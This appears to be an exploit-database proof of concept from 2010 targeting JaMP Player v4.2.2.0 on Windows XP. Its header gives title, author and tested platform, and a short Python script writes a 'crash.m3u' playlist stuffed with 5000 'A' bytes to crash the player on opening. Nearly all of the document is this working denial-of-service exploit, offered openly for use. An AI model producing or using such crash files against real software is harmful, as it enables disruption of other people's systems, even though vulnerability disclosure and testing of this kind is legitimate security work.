# Exploit Title: JaMP Player v4.2.2.0 (.m3u) DoS
# Date: 12 / 8 / 2010
# Author: Oh Yaw Theng
# Software Link: http://www.topdownloads.net/software/jamp-player_2_219088.html?hl=&ia=0
# Version: v4.2.2.0
# Tested on: Windows XP SP 2
# CVE : N / A

#!/usr/bin/python

filename = "crash.m3u"

junk = "\x41" * 5000

exploit = junk

textfile = open(filename,'w')
textfile.write(exploit)
textfile.close()